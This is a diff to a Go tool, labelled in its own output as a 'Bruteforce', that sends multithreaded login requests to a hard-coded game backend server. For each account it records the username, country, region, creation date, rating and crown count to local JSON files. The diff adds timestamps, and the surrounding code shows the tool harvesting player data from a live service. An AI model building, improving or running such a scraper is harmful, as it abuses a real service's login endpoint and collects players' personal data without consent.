@@ -13,6 +13,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"time"
 )
 
 func input(text string) string {
@@ -48,6 +49,7 @@ func pr(text string) {
 		username = strings.Split(username, ",")[0]
 		username = strings.Trim(username, "\"")
 		if !strings.HasPrefix(username, "Player ") {
+			dt := time.Now()
 			trophy := strings.Split(text, `"SkillRating":`)[1]
 			trophy = strings.Split(trophy, ",")[0]
 			crown := strings.Split(text, `"Crowns":`)[1]
@@ -64,7 +66,7 @@ func pr(text string) {
 			file, _ := os.Create("Result-Grabber-Go/" + username + ".json")
 			defer file.Close()
 			file.WriteString(string(jso))
-			fmt.Printf("Username: %s\nCountry: %s\nRegion: %s\nCreated At: %s\nCrown: %s\nTrophy: %s\nHas Battle Pass: %s\n" /*\n Skins Total: %d\n" /*Animations Total: %d\nEmotes Total: %d\nFootsteps Total: %d\n"*/, username, country, region, createdat, crown, trophy, hasbp /*, skintol /*, antol, stitol, footol*/)
+			fmt.Printf("[%s] Username: %s\nCountry: %s\nRegion: %s\nCreated At: %s\nCrown: %s\nTrophy: %s\nHas Battle Pass: %s\n", dt.Format("15:04:05"), username, country, region, createdat, crown, trophy, hasbp)
 		}
 	}
 }
@@ -97,11 +99,13 @@ func req(url string) {
 }
 
 func main() {
+	dt := time.Now()
 	thread := input("Threads: ")
 	thrd, _ := strconv.Atoi(thread)
 	url := "http://kitkabackend.eastus.cloudapp.azure.com:5010/user/login"
 	fmt.Printf("========================\n")
 	os.Mkdir("Result-Grabber-Go", os.ModePerm)
+	fmt.Printf("[%s] Starting Bruteforce at %s\n", dt.Format("15:04:05"), dt.Format(time.UnixDate))
 	for i := 0; i < thrd; i++ {
 		go func() {
 			for {
@@ -110,5 +114,5 @@ func main() {
 		}()
 	}
 	for {
-	} // Prevent exit
+	} // Prevent Exit
 }
